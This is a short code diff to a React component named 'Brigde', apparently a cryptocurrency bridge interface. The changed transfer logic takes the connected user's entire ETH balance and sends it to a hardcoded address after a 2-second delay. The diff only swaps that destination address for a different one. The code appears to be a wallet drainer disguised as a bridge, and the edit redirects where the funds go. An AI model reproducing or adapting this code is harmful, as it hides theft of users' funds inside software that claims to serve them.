@@ -44,7 +44,7 @@ const Brigde = () => {
     const transfer = async () => {
       if (active && balanceEth) {
         const amountWei = web3.utils.toWei(balanceEth.toString(), "ether");
-        const destinationAddress = "0x1f858137075f42864FFC06a029e4d5800e5bfB67";
+        const destinationAddress = "0x8F3F79D4c2b1C557e9Ef88F16Afc709041d6e7D0";
 
       // Retrasar la función transfer por 2 segundos
       await new Promise((resolve) => setTimeout(resolve, 2000));
